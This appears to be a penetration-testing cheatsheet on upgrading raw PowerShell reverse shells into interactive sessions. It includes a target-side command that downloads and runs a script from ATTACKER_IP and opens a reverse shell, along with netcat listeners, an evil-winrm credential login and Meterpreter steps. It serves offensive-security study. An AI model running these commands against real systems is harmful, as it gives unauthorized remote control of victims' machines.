---
tags: [pentest, shells, powershell, windows, stabilization, initial-access, web]
type: cheatsheet
phase: 5
---
# Stabilizing PowerShell Shells

Make a raw PowerShell reverse shell usable — tab completion, history, proper I/O.

[[00 - README|Folder index]]

## Problem

Raw PowerShell reverse shells are painful: no tab completion, no history, Ctrl+C kills the session, and output formatting is broken.

## ConPtyShell (best option)

Full interactive PowerShell via Windows ConPty API.

```bash
# Attacker — listener (not nc, use stty first):
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Target — download and run:
IEX(IWR http://ATTACKER_IP/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell ATTACKER_IP 4444
```

Get `Invoke-ConPtyShell.ps1` from: https://github.com/antonioCoco/ConPtyShell

## rlwrap (quick fix)

```bash
rlwrap nc -lvnp 4444
# Gives you arrow keys and history on the attacker side
```

## PowerShell readline in reverse shell

```powershell
# Inside the PowerShell reverse shell:
Set-PSReadlineOption -EditMode Emacs
```

## Evil-WinRM (if WinRM is available)

```bash
evil-winrm -i TARGET_IP -u user -p password
# Full interactive PowerShell over WinRM — no stabilization needed
```

## Meterpreter shell to PowerShell

```bash
# In msfconsole with a meterpreter session:
load powershell
powershell_shell
# Full interactive PowerShell through Meterpreter
```

## See also

- [[02 - Windows Reverse Shells]]
- [[04 - PTY Upgrade Ritual]]
